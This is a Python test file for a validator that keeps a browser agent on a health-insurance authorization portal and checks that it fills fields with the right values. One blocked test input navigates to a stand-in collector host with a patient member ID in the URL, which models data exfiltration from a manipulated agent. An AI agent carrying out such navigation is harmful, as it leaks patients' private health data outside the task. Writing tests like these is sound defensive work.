"""The browser agent can't be talked into leaving the portal or typing a real value into the wrong field."""
from types import SimpleNamespace

from authops.agent.validator import check

CASE = {"provider": {"npi": "1234567893"}, "patient": {"member_id": "NWH123456", "dob": "2015-03-04"},
        "cpt_codes": ["97110", "97140"], "icd10_codes": ["M54.50"], "requested_units": 24}
FRAME = SimpleNamespace(elements=[{"id": "npi", "name": "npi", "label": "Provider NPI"},
                                  {"id": "member", "name": "member", "label": "Member ID"},
                                  {"id": "dob", "name": "dob", "label": "Date of birth"},
                                  {"id": "cpt", "name": "cpt", "label": "CPT codes"}])
ON_PORTAL = SimpleNamespace(url="http://localhost:8000/northwind/request", frames=[FRAME])
BASE = "http://localhost:8000"


def kinds(act):
    return {f.kind for f in check(ON_PORTAL, act, CASE, {}, [], BASE)}


def test_goto_off_the_portal_is_blocked_before_it_runs():
    assert "off_domain" in kinds({"tool": "goto", "args": {"path": "https://collector.example/?m=NWH123456"}})
    assert "off_domain" in kinds({"tool": "goto", "args": {"path": "//collector.example/x"}})
    assert not kinds({"tool": "goto", "args": {"path": "/northwind/dashboard"}})
    assert not kinds({"tool": "goto", "args": {"path": "http://localhost:8000/northwind/x"}})


def test_tools_goto_refuses_other_hosts():
    import pytest

    from authops.agent.tools import ToolError, Tools
    t = Tools.__new__(Tools)
    t.base_url = BASE
    with pytest.raises(ToolError) as e:
        t.goto("https://collector.example/")
    assert e.value.error_class == "off_domain"


def test_real_value_in_the_wrong_field_is_blocked():
    assert "wrong_field_value" in kinds({"tool": "fill", "args": {"target": "Provider NPI", "value": "NWH123456"}})
    assert "wrong_field_value" in kinds({"tool": "fill", "args": {"target": "Member ID", "value": "1234567893"}})
    assert "wrong_field_value" in kinds({"tool": "fill", "args": {"target": "CPT codes", "value": "97110, 24"}})


def test_right_values_pass_in_any_date_format():
    assert not kinds({"tool": "fill", "args": {"target": "Provider NPI", "value": "1234567893"}})
    assert not kinds({"tool": "fill", "args": {"target": "Date of birth", "value": "03/04/2015"}})
    flags = check(ON_PORTAL, {"tool": "fill", "args": {"target": "CPT codes", "value": "97110, 97140"}}, CASE,
                  {"cpt_csv": "97110, 97140"}, [], BASE)   # runs pass the joined forms as case values
    assert not flags
